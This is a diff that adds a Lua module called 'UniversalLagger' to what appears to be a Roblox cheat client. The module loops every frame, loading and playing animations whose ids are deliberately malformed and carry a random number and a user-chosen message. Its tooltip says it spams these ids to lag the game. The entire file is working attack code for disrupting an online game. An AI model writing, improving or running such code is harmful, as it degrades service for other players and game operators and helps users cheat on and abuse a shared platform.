@@ -1,0 +1,31 @@
+local UniversalLagger
+local Message
+
+UniversalLagger = vape.Categories.World:CreateModule({
+	Name = 'UniversalLagger',
+	Function = function(callback)
+		if callback then
+			local random = Random.new()
+
+			repeat
+				local character = lplr.Character
+				local animator = character and character:FindFirstChildWhichIsA('Animator', true) or nil
+
+				if animator then
+					local animation = Instance.new('Animation')
+					animation.AnimationId = 'http=507770677\1'..random:NextInteger(1, 1000000)..'\n'..(Message.Value or '')..'\n'
+					local loaded = animator:LoadAnimation(animation)
+					loaded:Play(0, 0.0001, 0)
+				end
+
+				task.wait()
+			until not UniversalLagger.Enabled
+		end
+	end,
+	Tooltip = 'Spams malformed animation ids through your characters animator.'
+})
+Message = UniversalLagger:CreateTextBox({
+	Name = 'Message',
+	Placeholder = 'Message',
+	Tooltip = 'yk custom it'
+})
